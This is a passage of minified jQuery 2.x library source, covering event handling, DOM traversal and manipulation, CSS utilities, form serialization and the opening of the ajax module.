s,a,u,l,c,p,f,h=[r||o],d=y.call(t,"type")?t.type:t,g=y.call(t,"namespace")?t.namespace.split("."):[];if(a=u=r=r||o,3!==r.nodeType&&8!==r.nodeType&&!_.test(d+x.event.triggered)&&(d.indexOf(".")>=0&&(g=d.split("."),d=g.shift(),g.sort()),c=0>d.indexOf(":")&&"on"+d,t=t[x.expando]?t:new x.Event(d,"object"==typeof t&&t),t.isTrigger=i?2:3,t.namespace=g.join("."),t.namespace_re=t.namespace?RegExp("(^|\\.)"+g.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,t.result=undefined,t.target||(t.target=r),n=null==n?[t]:x.makeArray(n,[t]),f=x.event.special[d]||{},i||!f.trigger||f.trigger.apply(r,n)!==!1)){if(!i&&!f.noBubble&&!x.isWindow(r)){for(l=f.delegateType||d,_.test(l+d)||(a=a.parentNode);a;a=a.parentNode)h.push(a),u=a;u===(r.ownerDocument||o)&&h.push(u.defaultView||u.parentWindow||e)}s=0;while((a=h[s++])&&!t.isPropagationStopped())t.type=s>1?l:f.bindType||d,p=(q.get(a,"events")||{})[t.type]&&q.get(a,"handle"),p&&p.apply(a,n),p=c&&a[c],p&&x.acceptData(a)&&p.apply&&p.apply(a,n)===!1&&t.preventDefault();return t.type=d,i||t.isDefaultPrevented()||f._default&&f._default.apply(h.pop(),n)!==!1||!x.acceptData(r)||c&&x.isFunction(r[d])&&!x.isWindow(r)&&(u=r[c],u&&(r[c]=null),x.event.triggered=d,r[d](),x.event.triggered=undefined,u&&(r[c]=u)),t.result}},dispatch:function(e){e=x.event.fix(e);var t,n,r,i,o,s=[],a=d.call(arguments),u=(q.get(this,"events")||{})[e.type]||[],l=x.event.special[e.type]||{};if(a[0]=e,e.delegateTarget=this,!l.preDispatch||l.preDispatch.call(this,e)!==!1){s=x.event.handlers.call(this,e,u),t=0;while((i=s[t++])&&!e.isPropagationStopped()){e.currentTarget=i.elem,n=0;while((o=i.handlers[n++])&&!e.isImmediatePropagationStopped())(!e.namespace_re||e.namespace_re.test(o.namespace))&&(e.handleObj=o,e.data=o.data,r=((x.event.special[o.origType]||{}).handle||o.handler).apply(i.elem,a),r!==undefined&&(e.result=r)===!1&&(e.preventDefault(),e.stopPropagation()))}return l.postDispatch&&l.postDispatch.call(this,e),e.result}},handlers:function(e,t){var n,r,i,o,s=[],a=t.delegateCount,u=e.target;if(a&&u.nodeType&&(!e.button||"click"!==e.type))for(;u!==this;u=u.parentNode||this)if(u.disabled!==!0||"click"!==e.type){for(r=[],n=0;a>n;n++)o=t[n],i=o.selector+" ",r[i]===undefined&&(r[i]=o.needsContext?x(i,this).index(u)>=0:x.find(i,this,null,[u]).length),r[i]&&r.push(o);r.length&&s.push({elem:u,handlers:r})}return t.length>a&&s.push({elem:this,handlers:t.slice(a)}),s},props:"altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(e,t){return null==e.which&&(e.which=null!=t.charCode?t.charCode:t.keyCode),e}},mouseHooks:{props:"button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(e,t){var n,r,i,s=t.button;return null==e.pageX&&null!=t.clientX&&(n=e.target.ownerDocument||o,r=n.documentElement,i=n.body,e.pageX=t.clientX+(r&&r.scrollLeft||i&&i.scrollLeft||0)-(r&&r.clientLeft||i&&i.clientLeft||0),e.pageY=t.clientY+(r&&r.scrollTop||i&&i.scrollTop||0)-(r&&r.clientTop||i&&i.clientTop||0)),e.which||s===undefined||(e.which=1&s?1:2&s?3:4&s?2:0),e}},fix:function(e){if(e[x.expando])return e;var t,n,r,i=e.type,s=e,a=this.fixHooks[i];a||(this.fixHooks[i]=a=z.test(i)?this.mouseHooks:I.test(i)?this.keyHooks:{}),r=a.props?this.props.concat(a.props):this.props,e=new x.Event(s),t=r.length;while(t--)n=r[t],e[n]=s[n];return e.target||(e.target=o),3===e.target.nodeType&&(e.target=e.target.parentNode),a.filter?a.filter(e,s):e},special:{load:{noBubble:!0},focus:{trigger:function(){return this!==V()&&this.focus?(this.focus(),!1):undefined},delegateType:"focusin"},blur:{trigger:function(){return this===V()&&this.blur?(this.blur(),!1):undefined},delegateType:"focusout"},click:{trigger:function(){return"checkbox"===this.type&&this.click&&x.nodeName(this,"input")?(this.click(),!1):undefined},_default:function(e){return x.nodeName(e.target,"a")}},beforeunload:{postDispatch:function(e){e.result!==undefined&&(e.originalEvent.returnValue=e.result)}}},simulate:function(e,t,n,r){var i=x.extend(new x.Event,n,{type:e,isSimulated:!0,originalEvent:{}});r?x.event.trigger(i,null,t):x.event.dispatch.call(t,i),i.isDefaultPrevented()&&n.preventDefault()}},x.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n,!1)},x.Event=function(e,t){return this instanceof x.Event?(e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||e.getPreventDefault&&e.getPreventDefault()?U:Y):this.type=e,t&&x.extend(this,t),this.timeStamp=e&&e.timeStamp||x.now(),this[x.expando]=!0,undefined):new x.Event(e,t)},x.Event.prototype={isDefaultPrevented:Y,isPropagationStopped:Y,isImmediatePropagationStopped:Y,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=U,e&&e.preventDefault&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=U,e&&e.stopPropagation&&e.stopPropagation()},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=U,this.stopPropagation()}},x.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(e,t){x.event.special[e]={delegateType:t,bindType:t,handle:function(e){var n,r=this,i=e.relatedTarget,o=e.handleObj;return(!i||i!==r&&!x.contains(r,i))&&(e.type=o.origType,n=o.handler.apply(this,arguments),e.type=t),n}}}),x.support.focusinBubbles||x.each({focus:"focusin",blur:"focusout"},function(e,t){var n=0,r=function(e){x.event.simulate(t,e.target,x.event.fix(e),!0)};x.event.special[t]={setup:function(){0===n++&&o.addEventListener(e,r,!0)},teardown:function(){0===--n&&o.removeEventListener(e,r,!0)}}}),x.fn.extend({on:function(e,t,n,r,i){var o,s;if("object"==typeof e){"string"!=typeof t&&(n=n||t,t=undefined);for(s in e)this.on(s,t,n,e[s],i);return this}if(null==n&&null==r?(r=t,n=t=undefined):null==r&&("string"==typeof t?(r=n,n=undefined):(r=n,n=t,t=undefined)),r===!1)r=Y;else if(!r)return this;return 1===i&&(o=r,r=function(e){return x().off(e),o.apply(this,arguments)},r.guid=o.guid||(o.guid=x.guid++)),this.each(function(){x.event.add(this,e,r,n,t)})},one:function(e,t,n,r){return this.on(e,t,n,r,1)},off:function(e,t,n){var r,i;if(e&&e.preventDefault&&e.handleObj)return r=e.handleObj,x(e.delegateTarget).off(r.namespace?r.origType+"."+r.namespace:r.origType,r.selector,r.handler),this;if("object"==typeof e){for(i in e)this.off(i,t,e[i]);return this}return(t===!1||"function"==typeof t)&&(n=t,t=undefined),n===!1&&(n=Y),this.each(function(){x.event.remove(this,e,n,t)})},trigger:function(e,t){return this.each(function(){x.event.trigger(e,t,this)})},triggerHandler:function(e,t){var n=this[0];return n?x.event.trigger(e,t,n,!0):undefined}});var G=/^.[^:#\[\.,]*$/,J=/^(?:parents|prev(?:Until|All))/,Q=x.expr.match.needsContext,K={children:!0,contents:!0,next:!0,prev:!0};x.fn.extend({find:function(e){var t,n=[],r=this,i=r.length;if("string"!=typeof e)return this.pushStack(x(e).filter(function(){for(t=0;i>t;t++)if(x.contains(r[t],this))return!0}));for(t=0;i>t;t++)x.find(e,r[t],n);return n=this.pushStack(i>1?x.unique(n):n),n.selector=this.selector?this.selector+" "+e:e,n},has:function(e){var t=x(e,this),n=t.length;return this.filter(function(){var e=0;for(;n>e;e++)if(x.contains(this,t[e]))return!0})},not:function(e){return this.pushStack(et(this,e||[],!0))},filter:function(e){return this.pushStack(et(this,e||[],!1))},is:function(e){return!!et(this,"string"==typeof e&&Q.test(e)?x(e):e||[],!1).length},closest:function(e,t){var n,r=0,i=this.length,o=[],s=Q.test(e)||"string"!=typeof e?x(e,t||this.context):0;for(;i>r;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(11>n.nodeType&&(s?s.index(n)>-1:1===n.nodeType&&x.find.matchesSelector(n,e))){n=o.push(n);break}return this.pushStack(o.length>1?x.unique(o):o)},index:function(e){return e?"string"==typeof e?g.call(x(e),this[0]):g.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){var n="string"==typeof e?x(e,t):x.makeArray(e&&e.nodeType?[e]:e),r=x.merge(this.get(),n);return this.pushStack(x.unique(r))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}});function Z(e,t){while((e=e[t])&&1!==e.nodeType);return e}x.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return x.dir(e,"parentNode")},parentsUntil:function(e,t,n){return x.dir(e,"parentNode",n)},next:function(e){return Z(e,"nextSibling")},prev:function(e){return Z(e,"previousSibling")},nextAll:function(e){return x.dir(e,"nextSibling")},prevAll:function(e){return x.dir(e,"previousSibling")},nextUntil:function(e,t,n){return x.dir(e,"nextSibling",n)},prevUntil:function(e,t,n){return x.dir(e,"previousSibling",n)},siblings:function(e){return x.sibling((e.parentNode||{}).firstChild,e)},children:function(e){return x.sibling(e.firstChild)},contents:function(e){return e.contentDocument||x.merge([],e.childNodes)}},function(e,t){x.fn[e]=function(n,r){var i=x.map(this,t,n);return"Until"!==e.slice(-5)&&(r=n),r&&"string"==typeof r&&(i=x.filter(r,i)),this.length>1&&(K[e]||x.unique(i),J.test(e)&&i.reverse()),this.pushStack(i)}}),x.extend({filter:function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?x.find.matchesSelector(r,e)?[r]:[]:x.find.matches(e,x.grep(t,function(e){return 1===e.nodeType}))},dir:function(e,t,n){var r=[],i=n!==undefined;while((e=e[t])&&9!==e.nodeType)if(1===e.nodeType){if(i&&x(e).is(n))break;r.push(e)}return r},sibling:function(e,t){var n=[];for(;e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n}});function et(e,t,n){if(x.isFunction(t))return x.grep(e,function(e,r){return!!t.call(e,r,e)!==n});if(t.nodeType)return x.grep(e,function(e){return e===t!==n});if("string"==typeof t){if(G.test(t))return x.filter(t,e,n);t=x.filter(t,e)}return x.grep(e,function(e){return g.call(t,e)>=0!==n})}var tt=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,nt=/<([\w:]+)/,rt=/<|&#?\w+;/,it=/<(?:script|style|link)/i,ot=/^(?:checkbox|radio)$/i,st=/checked\s*(?:[^=]|=\s*.checked.)/i,at=/^$|\/(?:java|ecma)script/i,ut=/^true\/(.*)/,lt=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,ct={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};ct.optgroup=ct.option,ct.tbody=ct.tfoot=ct.colgroup=ct.caption=ct.thead,ct.th=ct.td,x.fn.extend({text:function(e){return x.access(this,function(e){return e===undefined?x.text(this):this.empty().append((this[0]&&this[0].ownerDocument||o).createTextNode(e))},null,e,arguments.length)},append:function(){return this.domManip(arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=pt(this,e);t.appendChild(e)}})},prepend:function(){return this.domManip(arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=pt(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return this.domManip(arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return this.domManip(arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},remove:function(e,t){var n,r=e?x.filter(e,this):this,i=0;for(;null!=(n=r[i]);i++)t||1!==n.nodeType||x.cleanData(mt(n)),n.parentNode&&(t&&x.contains(n.ownerDocument,n)&&dt(mt(n,"script")),n.parentNode.removeChild(n));return this},empty:function(){var e,t=0;for(;null!=(e=this[t]);t++)1===e.nodeType&&(x.cleanData(mt(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null==e?!1:e,t=null==t?e:t,this.map(function(){return x.clone(this,e,t)})},html:function(e){return x.access(this,function(e){var t=this[0]||{},n=0,r=this.length;if(e===undefined&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!it.test(e)&&!ct[(nt.exec(e)||["",""])[1].toLowerCase()]){e=e.replace(tt,"<$1></$2>");try{for(;r>n;n++)t=this[n]||{},1===t.nodeType&&(x.cleanData(mt(t,!1)),t.innerHTML=e);t=0}catch(i){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var e=x.map(this,function(e){return[e.nextSibling,e.parentNode]}),t=0;return this.domManip(arguments,function(n){var r=e[t++],i=e[t++];i&&(r&&r.parentNode!==i&&(r=this.nextSibling),x(this).remove(),i.insertBefore(n,r))},!0),t?this:this.remove()},detach:function(e){return this.remove(e,!0)},domManip:function(e,t,n){e=f.apply([],e);var r,i,o,s,a,u,l=0,c=this.length,p=this,h=c-1,d=e[0],g=x.isFunction(d);if(g||!(1>=c||"string"!=typeof d||x.support.checkClone)&&st.test(d))return this.each(function(r){var i=p.eq(r);g&&(e[0]=d.call(this,r,i.html())),i.domManip(e,t,n)});if(c&&(r=x.buildFragment(e,this[0].ownerDocument,!1,!n&&this),i=r.firstChild,1===r.childNodes.length&&(r=i),i)){for(o=x.map(mt(r,"script"),ft),s=o.length;c>l;l++)a=r,l!==h&&(a=x.clone(a,!0,!0),s&&x.merge(o,mt(a,"script"))),t.call(this[l],a,l);if(s)for(u=o[o.length-1].ownerDocument,x.map(o,ht),l=0;s>l;l++)a=o[l],at.test(a.type||"")&&!q.access(a,"globalEval")&&x.contains(u,a)&&(a.src?x._evalUrl(a.src):x.globalEval(a.textContent.replace(lt,"")))}return this}}),x.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){x.fn[e]=function(e){var n,r=[],i=x(e),o=i.length-1,s=0;for(;o>=s;s++)n=s===o?this:this.clone(!0),x(i[s])[t](n),h.apply(r,n.get());return this.pushStack(r)}}),x.extend({clone:function(e,t,n){var r,i,o,s,a=e.cloneNode(!0),u=x.contains(e.ownerDocument,e);if(!(x.support.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||x.isXMLDoc(e)))for(s=mt(a),o=mt(e),r=0,i=o.length;i>r;r++)yt(o[r],s[r]);if(t)if(n)for(o=o||mt(e),s=s||mt(a),r=0,i=o.length;i>r;r++)gt(o[r],s[r]);else gt(e,a);return s=mt(a,"script"),s.length>0&&dt(s,!u&&mt(e,"script")),a},buildFragment:function(e,t,n,r){var i,o,s,a,u,l,c=0,p=e.length,f=t.createDocumentFragment(),h=[];for(;p>c;c++)if(i=e[c],i||0===i)if("object"===x.type(i))x.merge(h,i.nodeType?[i]:i);else if(rt.test(i)){o=o||f.appendChild(t.createElement("div")),s=(nt.exec(i)||["",""])[1].toLowerCase(),a=ct[s]||ct._default,o.innerHTML=a[1]+i.replace(tt,"<$1></$2>")+a[2],l=a[0];while(l--)o=o.lastChild;x.merge(h,o.childNodes),o=f.firstChild,o.textContent=""}else h.push(t.createTextNode(i));f.textContent="",c=0;while(i=h[c++])if((!r||-1===x.inArray(i,r))&&(u=x.contains(i.ownerDocument,i),o=mt(f.appendChild(i),"script"),u&&dt(o),n)){l=0;while(i=o[l++])at.test(i.type||"")&&n.push(i)}return f},cleanData:function(e){var t,n,r,i,o,s,a=x.event.special,u=0;for(;(n=e[u])!==undefined;u++){if(F.accepts(n)&&(o=n[q.expando],o&&(t=q.cache[o]))){if(r=Object.keys(t.events||{}),r.length)for(s=0;(i=r[s])!==undefined;s++)a[i]?x.event.remove(n,i):x.removeEvent(n,i,t.handle);q.cache[o]&&delete q.cache[o]}delete L.cache[n[L.expando]]}},_evalUrl:function(e){return x.ajax({url:e,type:"GET",dataType:"script",async:!1,global:!1,"throws":!0})}});function pt(e,t){return x.nodeName(e,"table")&&x.nodeName(1===t.nodeType?t:t.firstChild,"tr")?e.getElementsByTagName("tbody")[0]||e.appendChild(e.ownerDocument.createElement("tbody")):e}function ft(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function ht(e){var t=ut.exec(e.type);return t?e.type=t[1]:e.removeAttribute("type"),e}function dt(e,t){var n=e.length,r=0;for(;n>r;r++)q.set(e[r],"globalEval",!t||q.get(t[r],"globalEval"))}function gt(e,t){var n,r,i,o,s,a,u,l;if(1===t.nodeType){if(q.hasData(e)&&(o=q.access(e),s=q.set(t,o),l=o.events)){delete s.handle,s.events={};for(i in l)for(n=0,r=l[i].length;r>n;n++)x.event.add(t,i,l[i][n])}L.hasData(e)&&(a=L.access(e),u=x.extend({},a),L.set(t,u))}}function mt(e,t){var n=e.getElementsByTagName?e.getElementsByTagName(t||"*"):e.querySelectorAll?e.querySelectorAll(t||"*"):[];return t===undefined||t&&x.nodeName(e,t)?x.merge([e],n):n}function yt(e,t){var n=t.nodeName.toLowerCase();"input"===n&&ot.test(e.type)?t.checked=e.checked:("input"===n||"textarea"===n)&&(t.defaultValue=e.defaultValue)}x.fn.extend({wrapAll:function(e){var t;return x.isFunction(e)?this.each(function(t){x(this).wrapAll(e.call(this,t))}):(this[0]&&(t=x(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){var e=this;while(e.firstElementChild)e=e.firstElementChild;return e}).append(this)),this)},wrapInner:function(e){return x.isFunction(e)?this.each(function(t){x(this).wrapInner(e.call(this,t))}):this.each(function(){var t=x(this),n=t.contents();n.length?n.wrapAll(e):t.append(e)})},wrap:function(e){var t=x.isFunction(e);return this.each(function(n){x(this).wrapAll(t?e.call(this,n):e)})},unwrap:function(){return this.parent().each(function(){x.nodeName(this,"body")||x(this).replaceWith(this.childNodes)}).end()}});var vt,xt,bt=/^(none|table(?!-c[ea]).+)/,wt=/^margin/,Tt=RegExp("^("+b+")(.*)$","i"),Ct=RegExp("^("+b+")(?!px)[a-z%]+$","i"),kt=RegExp("^([+-])=("+b+")","i"),Nt={BODY:"block"},Et={position:"absolute",visibility:"hidden",display:"block"},St={letterSpacing:0,fontWeight:400},jt=["Top","Right","Bottom","Left"],Dt=["Webkit","O","Moz","ms"];function At(e,t){if(t in e)return t;var n=t.charAt(0).toUpperCase()+t.slice(1),r=t,i=Dt.length;while(i--)if(t=Dt[i]+n,t in e)return t;return r}function Lt(e,t){return e=t||e,"none"===x.css(e,"display")||!x.contains(e.ownerDocument,e)}function qt(t){return e.getComputedStyle(t,null)}function Ht(e,t){var n,r,i,o=[],s=0,a=e.length;for(;a>s;s++)r=e[s],r.style&&(o[s]=q.get(r,"olddisplay"),n=r.style.display,t?(o[s]||"none"!==n||(r.style.display=""),""===r.style.display&&Lt(r)&&(o[s]=q.access(r,"olddisplay",Rt(r.nodeName)))):o[s]||(i=Lt(r),(n&&"none"!==n||!i)&&q.set(r,"olddisplay",i?n:x.css(r,"display"))));for(s=0;a>s;s++)r=e[s],r.style&&(t&&"none"!==r.style.display&&""!==r.style.display||(r.style.display=t?o[s]||"":"none"));return e}x.fn.extend({css:function(e,t){return x.access(this,function(e,t,n){var r,i,o={},s=0;if(x.isArray(t)){for(r=qt(e),i=t.length;i>s;s++)o[t[s]]=x.css(e,t[s],!1,r);return o}return n!==undefined?x.style(e,t,n):x.css(e,t)},e,t,arguments.length>1)},show:function(){return Ht(this,!0)},hide:function(){return Ht(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){Lt(this)?x(this).show():x(this).hide()})}}),x.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=vt(e,"opacity");return""===n?"1":n}}}},cssNumber:{columnCount:!0,fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":"cssFloat"},style:function(e,t,n,r){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var i,o,s,a=x.camelCase(t),u=e.style;return t=x.cssProps[a]||(x.cssProps[a]=At(u,a)),s=x.cssHooks[t]||x.cssHooks[a],n===undefined?s&&"get"in s&&(i=s.get(e,!1,r))!==undefined?i:u[t]:(o=typeof n,"string"===o&&(i=kt.exec(n))&&(n=(i[1]+1)*i[2]+parseFloat(x.css(e,t)),o="number"),null==n||"number"===o&&isNaN(n)||("number"!==o||x.cssNumber[a]||(n+="px"),x.support.clearCloneStyle||""!==n||0!==t.indexOf("background")||(u[t]="inherit"),s&&"set"in s&&(n=s.set(e,n,r))===undefined||(u[t]=n)),undefined)}},css:function(e,t,n,r){var i,o,s,a=x.camelCase(t);return t=x.cssProps[a]||(x.cssProps[a]=At(e.style,a)),s=x.cssHooks[t]||x.cssHooks[a],s&&"get"in s&&(i=s.get(e,!0,n)),i===undefined&&(i=vt(e,t,r)),"normal"===i&&t in St&&(i=St[t]),""===n||n?(o=parseFloat(i),n===!0||x.isNumeric(o)?o||0:i):i}}),vt=function(e,t,n){var r,i,o,s=n||qt(e),a=s?s.getPropertyValue(t)||s[t]:undefined,u=e.style;return s&&(""!==a||x.contains(e.ownerDocument,e)||(a=x.style(e,t)),Ct.test(a)&&wt.test(t)&&(r=u.width,i=u.minWidth,o=u.maxWidth,u.minWidth=u.maxWidth=u.width=a,a=s.width,u.width=r,u.minWidth=i,u.maxWidth=o)),a};function Ot(e,t,n){var r=Tt.exec(t);return r?Math.max(0,r[1]-(n||0))+(r[2]||"px"):t}function Ft(e,t,n,r,i){var o=n===(r?"border":"content")?4:"width"===t?1:0,s=0;for(;4>o;o+=2)"margin"===n&&(s+=x.css(e,n+jt[o],!0,i)),r?("content"===n&&(s-=x.css(e,"padding"+jt[o],!0,i)),"margin"!==n&&(s-=x.css(e,"border"+jt[o]+"Width",!0,i))):(s+=x.css(e,"padding"+jt[o],!0,i),"padding"!==n&&(s+=x.css(e,"border"+jt[o]+"Width",!0,i)));return s}function Pt(e,t,n){var r=!0,i="width"===t?e.offsetWidth:e.offsetHeight,o=qt(e),s=x.support.boxSizing&&"border-box"===x.css(e,"boxSizing",!1,o);if(0>=i||null==i){if(i=vt(e,t,o),(0>i||null==i)&&(i=e.style[t]),Ct.test(i))return i;r=s&&(x.support.boxSizingReliable||i===e.style[t]),i=parseFloat(i)||0}return i+Ft(e,t,n||(s?"border":"content"),r,o)+"px"}function Rt(e){var t=o,n=Nt[e];return n||(n=Mt(e,t),"none"!==n&&n||(xt=(xt||x("<iframe frameborder='0' width='0' height='0'/>").css("cssText","display:block !important")).appendTo(t.documentElement),t=(xt[0].contentWindow||xt[0].contentDocument).document,t.write("<!doctype html><html><body>"),t.close(),n=Mt(e,t),xt.detach()),Nt[e]=n),n}function Mt(e,t){var n=x(t.createElement(e)).appendTo(t.body),r=x.css(n[0],"display");return n.remove(),r}x.each(["height","width"],function(e,t){x.cssHooks[t]={get:function(e,n,r){return n?0===e.offsetWidth&&bt.test(x.css(e,"display"))?x.swap(e,Et,function(){return Pt(e,t,r)}):Pt(e,t,r):undefined},set:function(e,n,r){var i=r&&qt(e);return Ot(e,n,r?Ft(e,t,r,x.support.boxSizing&&"border-box"===x.css(e,"boxSizing",!1,i),i):0)}}}),x(function(){x.support.reliableMarginRight||(x.cssHooks.marginRight={get:function(e,t){return t?x.swap(e,{display:"inline-block"},vt,[e,"marginRight"]):undefined}}),!x.support.pixelPosition&&x.fn.position&&x.each(["top","left"],function(e,t){x.cssHooks[t]={get:function(e,n){return n?(n=vt(e,t),Ct.test(n)?x(e).position()[t]+"px":n):undefined}}})}),x.expr&&x.expr.filters&&(x.expr.filters.hidden=function(e){return 0>=e.offsetWidth&&0>=e.offsetHeight},x.expr.filters.visible=function(e){return!x.expr.filters.hidden(e)}),x.each({margin:"",padding:"",border:"Width"},function(e,t){x.cssHooks[e+t]={expand:function(n){var r=0,i={},o="string"==typeof n?n.split(" "):[n];for(;4>r;r++)i[e+jt[r]+t]=o[r]||o[r-2]||o[0];return i}},wt.test(e)||(x.cssHooks[e+t].set=Ot)});var Wt=/%20/g,$t=/\[\]$/,Bt=/\r?\n/g,It=/^(?:submit|button|image|reset|file)$/i,zt=/^(?:input|select|textarea|keygen)/i;x.fn.extend({serialize:function(){return x.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=x.prop(this,"elements");return e?x.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!x(this).is(":disabled")&&zt.test(this.nodeName)&&!It.test(e)&&(this.checked||!ot.test(e))}).map(function(e,t){var n=x(this).val();return null==n?null:x.isArray(n)?x.map(n,function(e){return{name:t.name,value:e.replace(Bt,"\r\n")}}):{name:t.name,value:n.replace(Bt,"\r\n")}}).get()}}),x.param=function(e,t){var n,r=[],i=function(e,t){t=x.isFunction(t)?t():null==t?"":t,r[r.length]=encodeURIComponent(e)+"="+encodeURIComponent(t)};if(t===undefined&&(t=x.ajaxSettings&&x.ajaxSettings.traditional),x.isArray(e)||e.jquery&&!x.isPlainObject(e))x.each(e,function(){i(this.name,this.value)});else for(n in e)_t(n,e[n],t,i);return r.join("&").replace(Wt,"+")};function _t(e,t,n,r){var i;if(x.isArray(t))x.each(t,function(t,i){n||$t.test(e)?r(e,i):_t(e+"["+("object"==typeof i?t:"")+"]",i,n,r)});else if(n||"object"!==x.type(t))r(e,t);else for(i in t)_t(e+"["+i+"]",t[i],n,r)}x.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(e,t){x.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),x.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)},bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)
},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}});var Xt,Ut,Yt=x.now(),Vt=/\?/,Gt=/#.*$/,Jt=/([?&])_=[^&]*/,Qt=/^(.*?):[ \t]*([^\r\n]*)$/gm,Kt=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,Zt=/^(?:GET|HEAD)$/,en=/^\/\//,tn=/^([\w.+-]+:)(?:\/\/([^\/?#:]*)(?::(\d+)|)|)/,nn=x.fn.load,rn={},on={},sn="*/".concat("*");try{Ut=i.href}catch(an){Ut=o.createElement("a"),Ut.href="",Ut=Ut.href}Xt=tn.exec(Ut.toLowerCase())||[];function un(e){return function(t,n){"string"!=typeof t&&(n=t,t="*");var r,i=0,o=t.toLowerCase().match(w)||[];if(x.isFunction(n))while(r=o[i++])"+"===r[0]?(r=r.slice(1)||"*",(e[r]=e[r]||[]).unshift(n)):(e[r]=e[r]||[]).push(n)}}function ln(e,t,n,r){var i={},o=e===on;function s(a){var u;return i[a]=!0,x.each(e[a]||[],function(e,a){var l=a(t,n,r);return"string"!=typeof l||o||i[l]?o?!(u=l):undefined:(t.dataTypes.unshift(l),s(l),!1)}),u}return s(t.dataTypes[0])||!i["*"]&&s("*")}function cn(e,t){var n,r,i=x.ajaxSettings.flatOptions||{};for(n in t)t[n]!==undefined&&((i[n]?e:r||(r={}))[n]=t[n]);return r&&x.extend(!0,e,r),e}x.fn.load=function(e,t,n){if("string"!=typeof e&&nn)return nn.apply(this,arguments);var r,i,o,s=this,a=e.indexOf(" ");return a>=0&&(r=e.slice(a),e=e.slice(0,a)),x.isFunction(t)?(n=t,t=undefined):t&&"object"==typeof t&&(i="POST"),s.length>0&&x.ajax({url:e,type:i,dataType:"html",data:t}).done(function(e){o=arguments,s.html(r?x("<div>").append(x.parseHTML(e)).find(r):e)}).complete(n&&function(e,t){s.each(n,o||[e.responseText,t,e])}),this},x.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){x.fn[t]=function(e){return this.on(t,e)}}),x.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:Ut,type:"GET",isLocal:Kt.test(Xt[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":sn,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":x.parseJSON,"text xml":x.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?cn(cn(e,x.ajaxSettings),t):cn(x.ajaxSettings,e)},ajaxPrefilter:un(rn),ajaxTransport:un(on),ajax:function(e,t){"object"==typeof e&&(t=e,e=undefined),t=t||{};var n,r,i,o,s,a,u,l,c=x.ajaxSetup({},t),p=c.context||c,f=c.context&&(p.nodeType||p.jquery)?x(p):x.event,h=x.Deferred(),d=x.Callbacks("once memory"),g=c.statusCode||{},m={},y={},v=0,b="canceled",T={readyState:0,getResponseHeader:function(e){var t;if(2===v){if(!o){o={};while(t=Qt.exec(i))o[t[1].toLowerCase()]=t[2]}t=o[e.toLowerCase()]}return null==t?null:t},getAllResponseHeaders:function(){return 2===v?i:null},setRequestHeader:function(e,t){var n=e.toLowerCase();return 